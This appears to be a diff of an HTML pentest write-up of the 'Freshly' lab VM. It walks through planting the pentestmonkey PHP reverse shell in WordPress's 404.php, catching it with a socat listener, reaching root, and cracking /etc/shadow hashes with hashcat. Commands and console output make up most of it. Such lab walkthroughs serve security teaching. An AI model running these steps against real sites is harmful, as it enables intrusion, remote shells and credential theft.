-<p>This one will be better for 2 reasons. First, a reverse shell is opened leading to getting root. Second, it updates <code class="file docutils literal"><span class="pre">404.php</span></code> which is less obvious than changing the often-used <code class="file docutils literal"><span class="pre">footer.php</span></code>. This is a combination of various reverse shell writeups on the web: <a class="reference external" href="http://rastamouse.me/blog/2015/tophatsec-freshly/">TopHatSec: Freshly</a> and <a class="reference external" href="http://www.mogozobo.com/?p=2468">A freshly squeezed cup of pwnage</a>.</p>
+<p>This one will be better for 2 reasons. First, a reverse shell is opened leading to getting root. Second, it updates <code class="file docutils literal notranslate"><span class="pre">404.php</span></code> which is less obvious than changing the often-used <code class="file docutils literal notranslate"><span class="pre">footer.php</span></code>. This is a combination of various reverse shell writeups on the web: <a class="reference external" href="http://rastamouse.me/blog/2015/tophatsec-freshly/">TopHatSec: Freshly</a> and <a class="reference external" href="http://www.mogozobo.com/?p=2468">A freshly squeezed cup of pwnage</a>.</p>
 <p><a class="reference external" href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey php-reverse-shell</a> is already available on Kali:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
 locate php <span class="p">|</span> grep reverse
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> locate php <span class="p">|</span> grep reverse
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> locate php <span class="p">|</span> grep reverse
 </span><span class="go">/usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php</span>
 <span class="go">/usr/share/laudanum/php/php-reverse-shell.php</span>
 <span class="hll"><span class="go">/usr/share/webshells/php/php-reverse-shell.php</span>
 </span></pre></div>
 </div>
-<p>Kali’s <code class="file docutils literal"><span class="pre">/usr/share/webshells/php/php-reverse-shell.php</span></code> is the pentestmonkey <code class="file docutils literal"><span class="pre">php-reverse-shell.php</span></code>.</p>
-<p>On the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> admin page select <span class="menuselection">Appearance ‣ Editor ‣ 404 Template (404.php)</span>, replace the contents with <code class="file docutils literal"><span class="pre">/usr/share/webshells/php/php-reverse-shell.php</span></code> php code. Edit the following 2 lines to reflect your attack machine’s ip &amp; port used:</p>
-<div class="highlight-perl"><div class="highlight"><pre><span></span><span class="nv">$ip</span> <span class="o">=</span> <span class="s">&#39;127.0.0.1&#39;</span><span class="p">;</span>  <span class="sr">//</span> <span class="n">CHANGE</span> <span class="n">THIS</span>
+<p>Kali’s <code class="file docutils literal notranslate"><span class="pre">/usr/share/webshells/php/php-reverse-shell.php</span></code> is the pentestmonkey <code class="file docutils literal notranslate"><span class="pre">php-reverse-shell.php</span></code>.</p>
+<p>On the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> admin page select <span class="menuselection">Appearance ‣ Editor ‣ 404 Template (404.php)</span>, replace the contents with <code class="file docutils literal notranslate"><span class="pre">/usr/share/webshells/php/php-reverse-shell.php</span></code> php code. Edit the following 2 lines to reflect your attack machine’s ip &amp; port used:</p>
+<div class="highlight-perl notranslate"><div class="highlight"><pre><span></span><span class="nv">$ip</span> <span class="o">=</span> <span class="s">&#39;127.0.0.1&#39;</span><span class="p">;</span>  <span class="sr">//</span> <span class="n">CHANGE</span> <span class="n">THIS</span>
 <span class="nv">$port</span> <span class="o">=</span> <span class="mi">1234</span><span class="p">;</span>       <span class="sr">//</span> <span class="n">CHANGE</span> <span class="n">THIS</span>
 </pre></div>
 </div>
 <p>At this point save your edits via <span class="menuselection">Update File</span>.</p>
 <p>On your attack machine fire up a listener:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># fire up a listener</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># fire up a listener</span>
 socat - TCP-LISTEN:1234
 </pre></div>
 </div>
 <p>Then in a separate window kick off the shell:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
 curl --silent http://<span class="nv">$T</span>:8080/wordpress/404.php
 </pre></div>
 </div>
 <p>Now you’ll get a tty-less shell back on your <strong class="program">socat</strong> terminal. Following <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> you’ll run the following in your reverse shell to correct the problem of being tty-less:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
 </pre></div>
 </div>
-<p>Here goes our exploit console. Notice that <code class="file docutils literal"><span class="pre">/etc/shadow</span></code> has improper permissions and we could use that for a brute force password cracking. But it turns out that root uses the admin password of “SuperSecretPassword”:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> socat - TCP-LISTEN:1234
+<p>Here goes our exploit console. Notice that <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code> has improper permissions and we could use that for a brute force password cracking. But it turns out that root uses the admin password of “SuperSecretPassword”:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> socat - TCP-LISTEN:1234
 </span><span class="go">Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 athlon i686 GNU/Linux</span>
 <span class="go"> 14:38:12 up  2:39,  0 users,  load average: 0.00, 0.01, 0.05</span>
 <span class="go">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
@@ -1043,8 +1043,8 @@ curl --silent http://<span class="nv">$T</span>:8080/wordpress/404.php
 </span><span class="hll"><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
 </span></pre></div>
 </div>
-<p>We’re root and so done. But what if that didn’t work? Let’s back out of root and do some recon to see if we can get at <code class="file docutils literal"><span class="pre">/etc/shadow</span></code> and crack the passwords.</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">root@Freshly:~#</span> <span class="nb">exit</span>
+<p>We’re root and so done. But what if that didn’t work? Let’s back out of root and do some recon to see if we can get at <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code> and crack the passwords.</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">root@Freshly:~#</span> <span class="nb">exit</span>
 </span><span class="hll"><span class="gp">daemon@Freshly:/$</span> ls -l /etc/shadow
 </span><span class="hll"><span class="go">ls -l /etc/shadow</span>
 </span><span class="hll"><span class="go">-rwxr-xr-x 1 root shadow 1030 Feb 17 01:56 /etc/shadow</span>
@@ -1078,8 +1078,8 @@ curl --silent http://<span class="nv">$T</span>:8080/wordpress/404.php
 <span class="gp">#</span> <span class="nv">SECRET</span> <span class="o">=</span> <span class="s2">&quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
 </pre></div>
 </div>
-<p>Let’s try and crack the hashes on our Kali Linux box using <strong class="program">hashcat</strong>. Cut and paste <code class="file docutils literal"><span class="pre">/etc/shadow</span></code> into <code class="file docutils literal"><span class="pre">$JOB/hashcat/shadow.txt</span></code> on Kali; once that’s done run the following to convert that to <strong class="program">hashcat</strong> format and crack the password:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/hashcat
+<p>Let’s try and crack the hashes on our Kali Linux box using <strong class="program">hashcat</strong>. Cut and paste <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code> into <code class="file docutils literal notranslate"><span class="pre">$JOB/hashcat/shadow.txt</span></code> on Kali; once that’s done run the following to convert that to <strong class="program">hashcat</strong> format and crack the password:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/hashcat
 <span class="hll"><span class="c1"># cut and paste /etc/shadow into shadow.txt</span>
 </span><span class="hll"><span class="c1"># get rid of everything except for the actual hash</span>
 </span><span class="hll">cut -d: -f2 shadow.txt <span class="p">|</span> grep <span class="s1">&#39;^$6\$&#39;</span> &gt; hashes.txt
@@ -1096,7 +1096,7 @@ curl --silent http://<span class="nv">$T</span>:8080/wordpress/404.php
 </span></pre></div>
 </div>
 <p>Running this gives us our password:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$ #</span> <span class="nb">cd</span> <span class="nv">$JOB</span>/hashcat
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$ #</span> <span class="nb">cd</span> <span class="nv">$JOB</span>/hashcat
 <span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span> cut and paste /etc/shadow into shadow.txt
 <span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$ #</span> get rid of everything except <span class="k">for</span> the actual <span class="nb">hash</span>
 <span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/hashcat$</span> cut -d: -f2 shadow.txt <span class="p">|</span> grep <span class="s1">&#39;^$6\$&#39;</span> &gt; hashes.txt
@@ -1143,7 +1143,7 @@ curl --silent http://<span class="nv">$T</span>:8080/wordpress/404.php
 </pre></div>
 </div>
 <p>With the cracked password we can get root as before on Freshly:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">daemon@Freshly:/$</span> su - root
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">daemon@Freshly:/$</span> su - root
 </span><span class="hll"><span class="go">su - root</span>
 </span><span class="hll"><span class="go">Password: SuperSecretPassword</span>
 </span><span class="hll">
